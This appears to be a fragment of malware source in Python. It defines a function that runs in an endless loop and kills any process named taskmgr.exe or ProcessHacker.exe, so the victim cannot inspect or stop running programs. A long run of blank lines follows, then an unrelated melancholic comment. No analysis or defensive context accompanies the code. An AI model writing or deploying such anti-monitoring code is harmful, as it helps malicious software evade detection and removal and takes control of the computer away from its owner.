import psutil
import subprocess
def kill_task():
    while True:
        for proc in psutil.process_iter():
            if proc.name().lower() == 'taskmgr.exe' or proc.name() == "ProcessHacker.exe":
                proc.terminate()

                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
                
# I walk around forever in a depressed state, as if the eternal spleen has descended on me
